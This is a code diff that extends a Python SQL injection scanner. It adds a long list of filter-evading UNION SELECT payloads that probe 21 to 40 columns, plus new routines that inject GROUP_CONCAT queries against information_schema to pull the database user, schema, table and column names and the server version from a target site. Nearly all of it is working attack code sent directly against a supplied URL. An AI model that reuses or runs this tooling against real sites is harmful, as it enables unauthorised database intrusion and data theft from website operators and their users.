@@ -52,6 +52,26 @@ payloads = [
     '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
     '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
     '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-',    
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-', 
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-', 
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-',  
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,32,32,33--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--+-',
+    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+-',
 ]
 
 print("[+] Testing 'UNION SELECT COLUMNS'............")
@@ -91,7 +111,7 @@ def get_columns():
                                 results_2 = requests.get(url + ver_payload)
                                 dbms_ver = results_2.text
 
-                                get_users = r"\b\w+@localhost\b"
+                                get_users = r"\b\w+@"
                                 mysql_usr = re.findall(get_users, html_content)
 
                                 get_ver_1 = r"\b\w+DB\b"
@@ -100,18 +120,28 @@ def get_columns():
                                 mariadb = re.findall(get_ver_1, dbms_ver)
                                 ubuntu = re.findall(get_ver_2, dbms_ver)
                                 mysql = re.findall(get_ver_3, dbms_ver)
-
+                                print('')
+                                print('  Blind Database ')
+                                print('-------------------')
                                 for usr_mysql in mysql_usr:
                                     if usr_mysql:
-                                        print("")
-                                        print("  Blind dbs  ")
-                                        print("---------------------")
-                                        print("Payload : {}".format(payload_1))
-                                        print("")
-                                        print("User MySQL :", usr_mysql)
-                                        print("Host : localhost")
-                                        print("Total Database : information_schema")
-                                        print("Columns : {}".format(num_columns))
+                                        def mysql_user():
+                                            rmv = usr_mysql.replace('@', '')
+                                            rmv2 = rmv.split('@')
+                                            user = rmv2[-1]
+                                            print('User :', user)
+                                            print("Columns : ", num_columns)
+                                            pl_schema = "(select group_concat(user(),' :: ',schema()))"
+                                            pl = re.sub(r"\b{}\b".format(num), pl_schema, payload)
+                                            results_4 = requests.get(url + pl)
+                                            html_1 = results_4.text
+                                            get_line = r"\b\w+class\b"
+                                            all_line = re.findall(get_line, html_1)
+                                            for schema in all_line:
+                                                if "::" in results_4.text:
+                                                    print("Schema :", schema)
+
+                                        mysql_user()
                                     else:
                                         print("[-] Oops, get user failed ?")
                                         exit()
@@ -131,11 +161,25 @@ def get_columns():
                                     results_3 = requests.get(url +query_id)
                                     html = results_3.text
                                     soup = BeautifulSoup(html, 'html.parser')
-                                    blind_data = soup.get_text(separator='\n')
+                                    blind_data = soup.find('html')
                                     print("")
                                     print("table_name | columns_name")
                                     print("--------------------------")
-                                    print(blind_data)
+                                    for line in blind_data:
+                                        if "::" in line.get_text():
+                                            print(line.get_text())
+                                    payload_dbs = "(SELECT+GROUP_CONCAT(user(),' :: ',database(),' :: ',table_name,' :: ',column_name,' :: ',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema='information_schema')"
+                                    query_id = re.sub(r'\b{}\b'.format(num), payload_dbs, payload)
+                                    results_3 = requests.get(url +query_id)
+                                    html = results_3.text
+                                    soup = BeautifulSoup(html, 'html.parser')
+                                    blind_data = soup.find('html')
+                                    print("")
+                                    print("table_name | columns_name")
+                                    print("--------------------------")
+                                    for line in blind_data:
+                                        if "::" in line.get_text():
+                                            print(line.get_text())
                                 get_dbs()
 
                             else:
